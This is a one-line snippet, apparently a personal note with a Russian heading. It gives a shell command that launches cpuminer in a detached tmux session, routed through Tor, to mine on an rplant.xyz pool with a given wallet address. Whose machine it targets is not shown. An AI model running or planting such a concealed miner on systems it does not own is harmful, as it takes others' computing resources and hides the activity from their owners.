#### CPUMINERRPLANT С КОНФИГОМ: tmux new -ds servak torify ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17079 -u uw38EeZwnZtCbgtKStGS5kDtStRt2zuriE.AUTOTUNE -p webpassword=5698 -t 2
